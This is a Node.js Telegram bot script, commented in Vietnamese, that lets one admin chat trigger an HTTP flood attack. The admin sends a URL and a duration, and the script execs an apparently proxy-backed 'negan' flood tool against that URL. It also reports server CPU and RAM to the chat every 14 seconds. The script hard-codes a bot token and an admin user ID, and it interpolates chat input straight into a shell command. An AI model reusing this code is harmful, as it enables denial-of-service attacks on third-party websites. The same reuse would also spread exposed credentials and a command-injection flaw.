const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const os = require('os');

const token = '8129263243:AAGihGBFbslIDKHRWgNV6K1_GrbVbcL718k';
const bot = new TelegramBot(token, { polling: true });

const adminId = 7371969470;

// Hàm lấy thông số CPU và RAM
function getSystemStats() {
    const totalMemory = os.totalmem(); // Tổng RAM (bytes)
    const freeMemory = os.freemem(); // RAM còn trống (bytes)
    const usedMemory = totalMemory - freeMemory; // RAM đã sử dụng (bytes)
    const memoryUsagePercent = ((usedMemory / totalMemory) * 100).toFixed(2); // % RAM đã sử dụng

    const cpus = os.cpus(); // Thông tin CPU cores
    const cpuUsagePercent = (
        cpus.reduce((acc, cpu) => {
            const total = Object.values(cpu.times).reduce((a, b) => a + b, 0);
            const idle = cpu.times.idle;
            return acc + (100 - (idle / total) * 100);
        }, 0) / cpus.length
    ).toFixed(2); // % CPU đã sử dụng

    return {
        memoryUsagePercent,
        cpuUsagePercent,
        totalMemory: (totalMemory / 1024 / 1024 / 1024).toFixed(0), // Chuyển đổi sang GB (làm tròn)
        freeMemory: (freeMemory / 1024 / 1024 / 1024).toFixed(0), // Chuyển đổi sang GB (làm tròn)
    };
}

// Gửi thông số CPU và RAM mỗi 14 giây
setInterval(() => {
    const stats = getSystemStats();
    const cpuFreePercent = (100 - parseFloat(stats.cpuUsagePercent)).toFixed(2); // % CPU còn trống

    const message = `
🚀 Thông số hệ thống:
- CPU đã sử dụng: ${stats.cpuUsagePercent}%
- RAM đã sử dụng: ${stats.memoryUsagePercent}%

❤️ Thông số còn trống
- CPU còn trống: ${cpuFreePercent}%
- RAM còn trống: ${stats.freeMemory}GB
- Tổng RAM: ${stats.totalMemory}GB
    `;
    bot.sendMessage(adminId, message);
}, 14000); // 14 giây

// Xử lý lệnh từ admin
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (chatId !== adminId) {
        bot.sendMessage(chatId, 'Bạn không có quyền thực hiện lệnh này.');
        return;
    }

    const parts = text.split(' ');
    if (parts.length !== 2 || !parts[0].startsWith('http')) {
        bot.sendMessage(chatId, 'Sai định dạng! Nhập theo: <URL> <time>.');
        return;
    }

    const [host, time] = parts;

    if (!host.startsWith('http://') && !host.startsWith('https://')) {
        bot.sendMessage(chatId, 'URL không hợp lệ! Cần có http:// hoặc https://.');
        return;
    }

    const command = `node ./negan -m GET -u ${host} -p 1.txt --full true -s ${time}`;

    // Thực thi lệnh và gửi thông báo thành công ngay lập tức
    exec(command);
    bot.sendMessage(chatId, `Lệnh đã được gửi Successfully: ${command}`);
});
